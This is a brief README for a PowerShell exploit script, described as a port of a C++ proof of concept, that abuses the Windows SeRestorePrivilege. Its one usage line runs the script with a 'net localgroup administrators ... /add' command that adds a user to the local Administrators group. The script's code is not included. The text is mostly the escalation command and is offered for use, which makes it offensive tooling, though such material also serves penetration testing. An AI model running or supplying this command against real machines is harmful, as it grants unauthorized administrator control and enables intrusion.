# SeRestorePrivilege_PowerShell
PowerShell script to exploit SeRestorePrivelege

Powershell Version of the C++ PoC from https://github.com/xct/SeRestoreAbuse 

**Useage**

The below command will add a user to the Administrators group. 

```.\SeRestorePrivilegeAbuse.ps1 "cmd /c net localgroup administrators {user_name} /add"```
